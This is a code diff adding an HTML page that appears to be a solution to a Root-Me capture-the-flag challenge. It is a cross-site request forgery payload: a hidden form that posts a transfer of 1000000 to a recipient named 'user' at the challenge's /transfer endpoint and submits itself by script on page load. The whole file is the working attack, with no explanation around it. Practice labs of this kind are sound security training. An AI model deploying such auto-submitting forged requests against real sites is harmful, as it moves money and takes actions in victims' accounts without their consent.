@@ -1,0 +1,13 @@
+<html>
+  <body>
+
+    <form id="csrf" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
+      <input type="hidden" name="recipient" value="user">
+      <input type="hidden" name="amount" value="1000000"> 
+    </form>
+
+    <script>
+      document.getElementById("csrf").submit();
+    </script>
+  </body>
+</html>
